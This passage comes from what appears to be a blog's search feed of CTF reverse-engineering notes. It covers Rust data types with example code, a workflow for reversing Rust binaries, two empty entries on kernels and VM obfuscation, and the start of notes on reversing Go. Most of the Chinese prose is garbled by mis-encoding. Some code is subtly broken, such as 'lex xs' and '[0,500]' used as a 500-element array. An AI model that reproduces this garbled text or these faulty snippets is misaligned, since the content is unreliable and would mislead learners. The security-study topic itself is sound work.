class="hljs-string">&quot;Second element: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">// `pop` removes the last element from the vector and returns it</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Pop last element: &#123;:?&#125;&quot;</span>, xs.<span class="hljs-title function_ invoke__">pop</span>());<br><br>    <span class="hljs-comment">// Out of bounds indexing yields a panic</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Fourth element: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">3</span>]);<br>    <span class="hljs-comment">// FIXME ^ Comment out this line</span><br><br>    <span class="hljs-comment">// `Vector`s can be easily iterated over</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Contents of xs:&quot;</span>);<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">x</span> <span class="hljs-keyword">in</span> xs.<span class="hljs-title function_ invoke__">iter</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&gt; &#123;&#125;&quot;</span>, x);<br>    &#125;<br><br>    <span class="hljs-comment">// A `Vector` can also be iterated over while the iteration</span><br>    <span class="hljs-comment">// count is enumerated in a separate variable (`i`)</span><br>    <span class="hljs-keyword">for</span> (i, x) <span class="hljs-keyword">in</span> xs.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">enumerate</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;In position &#123;&#125; we have value &#123;&#125;&quot;</span>, i, x);<br>    &#125;<br><br>    <span class="hljs-comment">// Thanks to `iter_mut`, mutable `Vector`s can also be iterated</span><br>    <span class="hljs-comment">// over in a way that allows modifying each value</span><br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">x</span> <span class="hljs-keyword">in</span> xs.<span class="hljs-title function_ invoke__">iter_mut</span>() &#123;<br>        *x *= <span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Updated vector: &#123;:?&#125;&quot;</span>, xs);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h3><p><img src="/assets/Pasted%20image%2020250217000115.png"></p><h3 id="tuple"><a href="#tuple" class="headerlink" title="tuple"></a><code>tuple</code></h3><p><img src="/assets/Pasted%20image%2020250217000058.png"></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Tuples can be used as function arguments and as return values</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">reverse</span>(pair: (<span class="hljs-type">i32</span>, <span class="hljs-type">bool</span>)) <span class="hljs-punctuation">-&gt;</span> (<span class="hljs-type">bool</span>, <span class="hljs-type">i32</span>) &#123;<br>    <span class="hljs-comment">// `let` can be used to bind the members of a tuple to variables</span><br>    <span class="hljs-keyword">let</span> (integer, boolean) = pair;<br><br>    (boolean, integer)<br>&#125;<br><br><span class="hljs-comment">// The following struct is for the activity.</span><br><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Matrix</span>(<span class="hljs-type">f32</span>, <span class="hljs-type">f32</span>, <span class="hljs-type">f32</span>, <span class="hljs-type">f32</span>);<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// A tuple with a bunch of different types</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">long_tuple</span> = (<span class="hljs-number">1u8</span>, <span class="hljs-number">2u16</span>, <span class="hljs-number">3u32</span>, <span class="hljs-number">4u64</span>,<br>                      -<span class="hljs-number">1i8</span>, -<span class="hljs-number">2i16</span>, -<span class="hljs-number">3i32</span>, -<span class="hljs-number">4i64</span>,<br>                      <span class="hljs-number">0.1f32</span>, <span class="hljs-number">0.2f64</span>,<br>                      <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-comment">// Values can be extracted from the tuple using tuple indexing</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;long tuple first value: &#123;&#125;&quot;</span>, long_tuple.<span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;long tuple second value: &#123;&#125;&quot;</span>, long_tuple.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Tuples can be tuple members</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tuple_of_tuples</span> = ((<span class="hljs-number">1u8</span>, <span class="hljs-number">2u16</span>, <span class="hljs-number">2u32</span>), (<span class="hljs-number">4u64</span>, -<span class="hljs-number">1i8</span>), -<span class="hljs-number">2i16</span>);<br><br>    <span class="hljs-comment">// Tuples are printable</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;tuple of tuples: &#123;:?&#125;&quot;</span>, tuple_of_tuples);<br>    <br>    <span class="hljs-comment">// But long Tuples cannot be printed</span><br>    <span class="hljs-comment">// let too_long_tuple = (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13);</span><br>    <span class="hljs-comment">// println!(&quot;too long tuple: &#123;:?&#125;&quot;, too_long_tuple);</span><br>    <span class="hljs-comment">// TODO ^ Uncomment the above 2 lines to see the compiler error</span><br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">pair</span> = (<span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair is &#123;:?&#125;&quot;</span>, pair);<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;the reversed pair is &#123;:?&#125;&quot;</span>, <span class="hljs-title function_ invoke__">reverse</span>(pair));<br><br>    <span class="hljs-comment">// To create one element tuples, the comma is required to tell them apart</span><br>    <span class="hljs-comment">// from a literal surrounded by parentheses</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;one element tuple: &#123;:?&#125;&quot;</span>, (<span class="hljs-number">5u32</span>,));<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;just an integer: &#123;:?&#125;&quot;</span>, (<span class="hljs-number">5u32</span>));<br><br>    <span class="hljs-comment">//tuples can be destructured to create bindings</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tuple</span> = (<span class="hljs-number">1</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-number">4.5</span>, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-keyword">let</span> (a, b, c, d) = tuple;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;, &#123;:?&#125;, &#123;:?&#125;, &#123;:?&#125;&quot;</span>, a, b, c, d);<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">matrix</span> = <span class="hljs-title function_ invoke__">Matrix</span>(<span class="hljs-number">1.1</span>, <span class="hljs-number">1.2</span>, <span class="hljs-number">2.1</span>, <span class="hljs-number">2.2</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, matrix);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Array-Slice"><a href="#Array-Slice" class="headerlink" title="Array_Slice"></a><code>Array_Slice</code></h3><p>æ•°ç»„åˆ†é…åœ¨æ ˆä¸Šï¼Œå¯ä»¥å¯¼è‡´æº¢å‡ºæ”»å‡»ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust">lex xs: [<span class="hljs-type">i32</span>;<span class="hljs-number">5</span>]=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>];<br><br><span class="hljs-keyword">let</span> <span class="hljs-variable">ys</span>: [<span class="hljs-type">i32</span>;<span class="hljs-number">500</span>]=[<span class="hljs-number">0</span>,<span class="hljs-number">500</span>];<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020250405113840.png"></p><p>åˆ‡ç‰‡</p><p>rust ä¸­çš„åˆ‡ç‰‡å°±æ˜¯ï¼ˆæ•°æ®åœ°å€ï¼Œé•¿åº¦ï¼‰</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-variable">ys</span>:[<span class="hljs-type">i32</span>;<span class="hljs-number">500</span>]=[<span class="hljs-number">0</span>;<span class="hljs-number">500</span>];<br><span class="hljs-title function_ invoke__">analyze_slice</span>(&amp;ys[<span class="hljs-number">1</span>..<span class="hljs-number">4</span>]);<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020250405114017.png"></p><p><img src="/assets/Pasted%20image%2020250217000139.png"></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::mem;<br><br><span class="hljs-comment">// This function borrows a slice</span><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">analyze_slice</span>(slice: &amp;[<span class="hljs-type">i32</span>]) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;first element of the slice: &#123;&#125;&quot;</span>, slice[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;the slice has &#123;&#125; elements&quot;</span>, slice.<span class="hljs-title function_ invoke__">len</span>());<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// Fixed-size array (type signature is superfluous)</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">xs</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">5</span>] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br>    <span class="hljs-comment">// All elements can be initialized to the same value</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ys</span>: [<span class="hljs-type">i32</span>; <span class="hljs-number">500</span>] = [<span class="hljs-number">0</span>; <span class="hljs-number">500</span>];<br><br>    <span class="hljs-comment">// Indexing starts at 0</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;first element of the array: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second element of the array: &#123;&#125;&quot;</span>, xs[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;3 nums:&#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>, xs[<span class="hljs-number">0</span>], xs[<span class="hljs-number">1</span>], xs[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-comment">// `len` returns the count of elements in the array</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;number of elements in array: &#123;&#125;&quot;</span>, xs.<span class="hljs-title function_ invoke__">len</span>());<br><br>    <span class="hljs-comment">// Arrays are stack allocated</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;array occupies &#123;&#125; bytes&quot;</span>, mem::<span class="hljs-title function_ invoke__">size_of_val</span>(&amp;xs));<br><br>    <span class="hljs-comment">// Arrays can be automatically borrowed as slices</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;borrow the whole array as a slice&quot;</span>);<br>    <span class="hljs-title function_ invoke__">analyze_slice</span>(&amp;xs);<br><br>    <span class="hljs-comment">// Slices can point to a section of an array</span><br>    <span class="hljs-comment">// They are of the form [starting_index..ending_index]</span><br>    <span class="hljs-comment">// starting_index is the first position in the slice</span><br>    <span class="hljs-comment">// ending_index is one more than the last position in the slice</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;borrow a section of the array as a slice&quot;</span>);<br>    <span class="hljs-title function_ invoke__">analyze_slice</span>(&amp;ys[<span class="hljs-number">1</span> .. <span class="hljs-number">4</span>]);<br><br>    <span class="hljs-comment">// Out of bound indexing causes compile error</span><br>    <span class="hljs-comment">// println!(&quot;&#123;&#125;&quot;, xs[5]);</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h2><p><img src="/assets/Pasted%20image%2020250217000256.png"></p><h2 id="è¯­æ³•ç‰¹æ€§"><a href="#è¯­æ³•ç‰¹æ€§" class="headerlink" title="è¯­æ³•ç‰¹æ€§"></a>è¯­æ³•ç‰¹æ€§</h2><h3 id="æ‰€æœ‰æƒå’Œå£°æ˜å‘¨æœŸ"><a href="#æ‰€æœ‰æƒå’Œå£°æ˜å‘¨æœŸ" class="headerlink" title="æ‰€æœ‰æƒå’Œå£°æ˜å‘¨æœŸ"></a>æ‰€æœ‰æƒå’Œå£°æ˜å‘¨æœŸ</h3><h3 id="é™æ€å’ŒåŠ¨æ€åˆ†é…"><a href="#é™æ€å’ŒåŠ¨æ€åˆ†é…" class="headerlink" title="é™æ€å’ŒåŠ¨æ€åˆ†é…"></a>é™æ€å’ŒåŠ¨æ€åˆ†é…</h3><h3 id="æ³›å‹å’Œç¼–è¯‘æ—¶ä¼˜åŒ–"><a href="#æ³›å‹å’Œç¼–è¯‘æ—¶ä¼˜åŒ–" class="headerlink" title="æ³›å‹å’Œç¼–è¯‘æ—¶ä¼˜åŒ–"></a>æ³›å‹å’Œç¼–è¯‘æ—¶ä¼˜åŒ–</h3><h2 id="ç¬¦å·è¿˜åŸ"><a href="#ç¬¦å·è¿˜åŸ" class="headerlink" title="ç¬¦å·è¿˜åŸ"></a>ç¬¦å·è¿˜åŸ</h2><blockquote><p>Rust ç¬¦å·æ¢å¤å·¥å…·ï¼š<a href="https://github.com/h311d1n3r/Cerberus" title="GitHub - h311d1n3r&#x2F;Cerberus: A Python tool to unst...">GitHub - h311d1n3r&#x2F;Cerberus: A Python tool to unstâ€¦</a> </p></blockquote><ul><li>ä½¿ç”¨</li></ul><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>Rust é€†å‘æµç¨‹ï¼š</p><ul><li>å­—ç¬¦ä¸²ä¿¡æ¯æœé›†<ul><li>æœç´¢<code>.rs</code>çœ‹ç”¨äº†å“ªäº›åº“ï¼Œä¹Ÿæ²¡æœ‰å¯†ç åº“<ul><li>æ‰¾åº“å­æºç ã€ä¾‹å­&#x2F;å¯¹ç…§é€†å‘</li></ul></li><li>æœç´¢æ ‡å‡†è¾“å‡ºã€flagç­‰å…³é”®å­—<ul><li>æ‰¾è°ƒè¯•ä½ç½®ã€è°ƒè¯•è§‚å¯Ÿæ•°æ®å˜åŒ–ï¼ŒçŒœ</li></ul></li></ul></li></ul><blockquote><p>2024 Moectf</p></blockquote><blockquote><p>2024YLCTF [Round 2] keygen_rust</p></blockquote><blockquote><p>[AFCTF 2021]rustcheckin</p></blockquote><p>å­—ç¬¦ä¸²æœé›†</p><ul><li>æœç´¢<code>.rs</code>çœ‹ç”¨äº†å“ªäº›åº“ï¼Œæœ‰æ²¡æœ‰å¯†ç åº“</li><li>æœç´¢æ ‡å‡†è¾“å‡ºï¼Œflagç­‰å…³é”®å­—</li><li>æ‰¾åº“å­æºç ã€ä¾‹å­ï¼Œå¯¹ç…§é€†å‘</li><li>æ‰¾è°ƒè¯•ä½ç½®ã€è°ƒè¯•ã€è§‚å¯Ÿæ•°æ®å˜åŒ–</li></ul><blockquote><p>2024 YCB sedRust_happyVm</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p>å‚è€ƒï¼š<a href="https://www.youtube.com/watch?v=rDoqT-a6UFg">Visualizing memory layout of Rustâ€™s data types [See description&#x2F;first comment]</a><br>å‚è€ƒï¼šCTF ä» 0 åˆ° 1<br><a href="https://research.qianxin.com/archives/2342">Rusté€†å‘å…¥é—¨ï¼šä»åç¼–è¯‘è§†è§’å­¦ä¹ å†…å­˜æ¨¡å‹ â€“ å¥‡å®‰ä¿¡æŠ€æœ¯ç ”ç©¶é™¢</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é«˜çº§è¯­è¨€é€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KernelåŸºç¡€å…¥é—¨</title>
      <link href="/2025/07/01/ctf/kernel/base/"/>
      <url>/2025/07/01/ctf/kernel/base/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VMæŒ‡ä»¤è™šæ‹ŸåŒ–åˆ†æ</title>
      <link href="/2025/07/01/ctf/re/vm/"/>
      <url>/2025/07/01/ctf/re/vm/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘å¯¹æŠ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Goé€†å‘åˆ†æ</title>
      <link href="/2025/07/01/ctf/re/go/"/>
      <url>/2025/07/01/ctf/re/go/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Go è¯­è¨€ç±»ä¼¼äº C è¯­è¨€ï¼Œç›®æ ‡æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€†å‘çš„ä¹Ÿæ˜¯ native ä»£ç å®ƒæœ‰å¦‚ä¸‹ç‰¹æ€§</p><ul><li>å¼ºç±»å‹æ£€æŸ¥çš„ç¼–è¯‘å‹è¯­è¨€ï¼Œæ¥è¿‘ C ä½†æ‹¥æœ‰åŸç”Ÿçš„åŒ…ç®¡ç†ï¼Œå†…å»ºçš„ç½‘ç»œåŒ…ï¼Œåç¨‹ç­‰ä½¿å…¶æˆä¸ºä¸€æ¬¾å¼€å‘æ•ˆç‡æ›´é«˜çš„å·¥ç¨‹çº§è¯­è¨€ã€‚</li><li>ä½œä¸ºç¼–è¯‘å‹è¯­è¨€å®ƒæœ‰å¼€å‘é€Ÿåº¦å¿«çš„ä¼˜ç‚¹ï¼Œä½†æ˜¯å®ƒåˆèƒ½é€šè¿‡å†…ç½®çš„è¿è¡Œæ—¶ç¬¦å·ä¿¡æ¯å®ç°åå°„è¿™ç§åŠ¨æ€ç‰¹æ€§ã€‚</li><li>Goè¯­è¨€ä½œä¸ºä¸€ç§å†…å­˜å®‰å…¨çš„è¯­è¨€ï¼Œä»–ä¸ä»…æœ‰å†…å»ºçš„åƒåœ¾å›æ”¶ï¼Œè¿˜åœ¨ç¼–è¯‘ä¸è¿è¡Œæ—¶æä¾›äº†å¤§é‡çš„å®‰å…¨æ£€æŸ¥ã€‚</li></ul><p>Goé€šå¸¸ä½¿ç”¨é™æ€é“¾æ¥ç¨‹åºï¼Œæ‰€ä»¥å®ƒä¼šç›´æ¥å°†åº“æ‰“åŒ…é“¾æ¥è¿›æ¥ï¼Œå› æ­¤ç¨‹åºä½“ç§¯ä¼šæ¯”è¾ƒå¤§ã€‚è€Œä¸”ç¬¬ä¸‰æ–¹åº“ã€æ ‡å‡†åº“ä¸ç”¨æˆ·ä»£ç æ··åœ¨ä¸€èµ·ï¼Œéœ€è¦åŒºåˆ†ã€‚</p><p>åœ¨åˆ†æ Go è¯­è¨€ç¼–å†™çš„äºŒè¿›åˆ¶ç¨‹åºå‰ï¼Œéœ€è¦å¼„æ¸…æ¥šæŸä¸€æ“ä½œæ˜¯å‘ç”Ÿåœ¨ç¼–è¯‘æœŸé—´è¿˜æ˜¯è¿è¡ŒæœŸé—´ï¼Œèƒ½åœ¨ç¼–è¯‘æ—¶åšçš„äº‹å°±åœ¨ç¼–è¯‘æ—¶åšï¼Œè¿™èƒ½å®ç°é”™è¯¯å‰ç§»å¹¶æé«˜è¿è¡Œæ•ˆç‡ç­‰ï¼Œè€Œä¸ºäº†è¯­è¨€çš„çµæ´»æ€§å¼•å…¥çš„æŸäº›åŠŸèƒ½åˆå¿…é¡»åœ¨è¿è¡Œæ—¶æ‰èƒ½ç¡®å®šï¼Œåœ¨è¿™æ—¶å°±éœ€è¦æƒ³åˆ°è¿è¡Œæ—¶å®ƒåº”è¯¥æ€ä¹ˆåšï¼Œåˆéœ€è¦ä¸ºå®ƒæä¾›å“ªäº›æ•°æ®ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>s:=[...]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%s %s\n&quot;</span>,s[<span class="hljs-number">0</span>],s[<span class="hljs-number">1</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ç¬¬äºŒè¡Œå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œç¬¬ä¸‰è¡Œå°†å…¶è¾“å‡ºï¼Œç¼–è¯‘é˜¶æ®µå°±èƒ½ç¡®å®šå…ƒç´ è®¿é—®çš„æŒ‡ä»¤ä»¥åŠä¸‹æ ‡è®¿é—®æ˜¯å¦è¶Šç•Œï¼Œäºæ˜¯å°±å¯ä»¥å»é™¤ s çš„ç±»å‹ä¿¡æ¯ã€‚ä½†æ˜¯ç”±äº Printf çš„è¾“å…¥æ˜¯<code>interface&#123;&#125;</code>ç±»å‹ï¼Œå› æ­¤åœ¨ç¼–è¯‘æ—¶å®ƒæ— æ³•å¾—çŸ¥ä¼ å…¥çš„æ•°æ®å®é™…ä¸ºä»€ä¹ˆç±»å‹ã€‚ä½†æ˜¯ä½œä¸ºä¸€ä¸ªè¾“å‡ºå‡½æ•°ï¼Œå¸Œæœ›ä¼ å…¥æ•°å­—æ—¶ç›´æ¥è¾“å‡ºï¼Œä¼ å…¥æ•°ç»„æ—¶éå†è¾“å‡ºæ¯ä¸ªå…ƒç´ ï¼Œé‚£ä¹ˆåœ¨ä¼ å…¥å‚æ•°æ—¶ï¼Œå°±éœ€è¦åœ¨ç¼–è¯‘æ—¶æŠŠå®é™…å‚æ•°çš„ç±»å‹ä¸å‚æ•°ç»‘å®šåå†ä¼ å…¥<code>Printf</code>ï¼Œåœ¨è¿è¡Œæ—¶å®ƒå°±èƒ½è·Ÿè¿›å‚æ•°ç»‘å®šçš„ä¿¡æ¯ç¡®å®šæ˜¯ä»€ä¹ˆç±»å‹äº†ã€‚</p><p>å…¶å®åœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨åšçš„äº‹è¿˜å¾ˆå¤šï¼Œä»é€†å‘çœ‹åªéœ€è¦æ³¨æ„å®ƒä¼šå°†å¾ˆå¤šæ“ä½œè½¬æ¢ä¸º<code>runtime</code>çš„å†…å»ºå‡½æ•°è°ƒç”¨ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a:=<span class="hljs-string">&quot;123&quot;</span><br>s:=<span class="hljs-string">&quot;abc&quot;</span>+a+<span class="hljs-string">&quot;cba&quot;</span><br></code></pre></td></tr></table></figure><p>å°†è¢«è½¬æ¢ä¸º<code>concatstring3</code>å‡½æ•°è°ƒç”¨ï¼š</p><p><img src="/assets/Pasted%20image%2020250108090404.png"></p><p>è‹¥éœ€è¦è§‚å¯ŸæŸè¯­æ³•æœ€ç»ˆç”Ÿæˆçš„æ±‡ç¼–ä»£ç ï¼Œå‡ºäº†ä½¿ç”¨ ida è¿˜å¯ä»¥ä½¿ç”¨ Go è‡ªå¸¦çš„å·¥å…·ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span> tool <span class="hljs-built_in">compile</span> -N -l -S <span class="hljs-built_in">demo</span>.<span class="hljs-built_in">go</span>       <br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¼–è¯‘</span><br>go build demo.go<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¦æ­¢ä¼˜åŒ–</span><br>go build -gcflags=&quot;-N -l&quot; demo.go<br><span class="hljs-meta prompt_">#</span><span class="language-bash">å»æ‰è°ƒè¯•ä¿¡æ¯å’Œç¬¦å·</span><br>go build -ldflags=&quot;-w -s&quot; demo.go<br></code></pre></td></tr></table></figure><h2 id="è°ƒç”¨çº¦å®šä¸ä¼ å‚"><a href="#è°ƒç”¨çº¦å®šä¸ä¼ å‚" class="headerlink" title="è°ƒç”¨çº¦å®šä¸ä¼ å‚"></a>è°ƒç”¨çº¦å®šä¸ä¼ å‚</h2><p>Go ä½¿ç”¨ç‹¬ç‰¹çš„è°ƒç”¨çº¦å®šã€‚</p><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><table><thead><tr><th>ç±»å‹</th><th>32ä½</th><th>64ä½</th></tr></thead><tbody><tr><td>boolã€int8ã€uint8</td><td>8bit</td><td>8bit</td></tr><tr><td>int16ã€uint16</td><td>16bit</td><td>16bit</td></tr><tr><td>int32ã€uint32ã€float32</td><td>32bit</td><td>32bit</td></tr><tr><td>int64ã€uint64ã€float64ã€complex64</td><td>64bit</td><td>64bit</td></tr><tr><td>intã€uintã€uintptr</td><td>32bit</td><td>64bit</td></tr><tr><td>cpmplex128</td><td>128bit</td><td>128bit</td></tr></tbody></table><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><h3 id="string"><a href="#string" class="headerlink" title="string"></a>string</h3><p>ä¼ ç»Ÿçš„ C æ˜¯é€šè¿‡<code>\0</code>ç»“æŸç¬¦æ¥è¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸä½ç½®ï¼Œè€Œ Go è¯­è¨€åˆ™ä¸åŒå®ƒé€šè¿‡å­˜å‚¨å­—ç¬¦ä¸²é•¿åº¦æ¥ç¡®å®šå­—ç¬¦ä¸²ç»“æŸä½ç½®ã€‚</p><p>åœ¨ Go 